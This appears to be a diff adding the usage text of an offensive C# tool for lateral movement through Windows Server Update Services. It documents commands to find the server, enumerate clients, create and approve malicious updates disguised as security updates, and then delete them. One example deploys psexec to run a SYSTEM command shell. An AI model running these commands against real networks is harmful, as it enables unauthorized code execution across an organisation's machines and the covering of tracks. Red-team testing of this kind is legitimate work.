@@ -1,0 +1,41 @@
+ABOUT
+    C# tool for lateral movement through WSUS. Creates, approves, and deploys malicious
+    updates to target machines via the WSUS server.
+
+USAGE:
+    net-sharp-wsus --- <command> [options]
+
+COMMANDS:
+    locate      Locate the WSUS server
+    inspect     Enumerate WSUS clients, servers, and groups
+    create      Create a malicious update
+    approve     Approve update for target computer
+    check       Check update deployment status
+    delete      Delete update and clean up groups
+
+CREATE OPTIONS:
+    /payload    File location (must be Windows signed binary)
+    /args       Arguments for payload
+    /title      Update title
+    /date       Date (YYYY-MM-DD)
+    /kb         KB number
+    /rating     Update rating
+    /description Update description
+    /url        Update URL
+
+APPROVE OPTIONS:
+    /updateid       Update GUID
+    /computername   Target computer FQDN
+    /groupname      Group for computer
+    /approver       Approver name
+
+EXAMPLES:
+    net-sharp-wsus --- locate
+    net-sharp-wsus --- inspect
+    net-sharp-wsus --- create /payload:"C:\\tools\\psexec.exe" /args:"-accepteula -s cmd.exe /c whoami" /title:"Security Update"
+    net-sharp-wsus --- approve /updateid:GUID /computername:host.corp.local /groupname:"Deploy Group"
+    net-sharp-wsus --- check /updateid:GUID /computername:host.corp.local
+    net-sharp-wsus --- delete /updateid:GUID /computername:host.corp.local
+
+NOTES:
+    Payload must be a Windows signed binary (psexec, msiexec, msbuild, etc.).
